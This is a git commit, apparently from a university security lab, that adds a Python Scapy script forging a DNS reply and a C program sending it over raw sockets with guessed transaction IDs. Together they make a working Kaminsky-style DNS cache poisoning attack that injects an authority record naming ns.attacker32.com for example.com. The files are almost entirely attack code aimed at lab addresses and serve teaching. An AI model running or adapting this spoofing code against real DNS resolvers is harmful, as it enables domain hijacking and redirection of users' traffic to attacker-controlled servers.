f2c30e127490c4d877337f6c9a52f06eeee22046
wedu from VM <wedu@syr.edu>
2019-03-06 23:33:54 -0500

    ...

---
+++ DNS/dns_construction_C/generate_dns_reply.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+IPpkt = IP(dst='10.0.2.69', src='10.2.3.4')
+UDPpkt = UDP(dport=33333, sport=53)
+
+targetName = 'aaaaa.example.com'
+targetDomain = 'example.com'
+
+Qdsec  = DNSQR(qname=targetName)
+Anssec = DNSRR(rrname=targetName, type='A',
+               rdata='1.2.3.4', ttl=259200)
+NSsec  = DNSRR(rrname=targetDomain, type='NS',
+               rdata='ns.attacker32.com', ttl=259200)
+DNSpkt = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
+             qdcount=1, ancount=1, nscount=1, arcount=0,
+             qd=Qdsec, an=Anssec, ns=NSsec)
+Replypkt = IPpkt/UDPpkt/DNSpkt
+with open('ip.bin', 'wb') as f:
+  f.write(bytes(Replypkt))
+
---
+++ DNS/dns_construction_C/send_premade_dns.c
@@ -0,0 +1,60 @@
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define MAX_FILE_SIZE   2000
+#define TARGET_IP "10.0.2.69" 
+
+int send_raw_socket(int sock, char *ip, int n);
+
+int main()
+{
+  // Create raw socket
+  int enable = 1;
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));      
+
+  // Read the DNS packet from file
+  FILE *f = fopen("ip.bin", "rb");
+  if (!f) {
+    perror("Can't open 'ip.bin'");
+    exit(0);
+  } 
+  unsigned char ip[MAX_FILE_SIZE];
+  int n = fread(ip, 1, MAX_FILE_SIZE, f);
+  printf("Total IP packet size: %d\n", n);
+
+  // Modify the name in the question field (offset=41)
+  memcpy(ip+41, "bbbbb" , 5); 
+  // Modify the name in the answer field (offset=64)
+  memcpy(ip+64, "bbbbb" , 5); 
+
+  for (int guess=1; guess<10; guess++){
+     // Modify the transaction ID field (offset=28)
+     unsigned short id[2];
+     *id = htons(guess);
+     memcpy(ip+28, (void *) id, 2); 
+
+     // Send the IP packet out
+     send_raw_socket(sock, ip, n);
+  }
+
+  close(sock);
+}
+
+int send_raw_socket(int sock, char *ip, int n)
+{
+  struct sockaddr_in dest_info;
+  dest_info.sin_family = AF_INET;
+  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);
+
+  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+  if (r>=0) printf("Sent a packet of size: %d\n", r);
+  else printf("Failed to send packet. Did you run it using sudo?\n");
+}
+
+
+
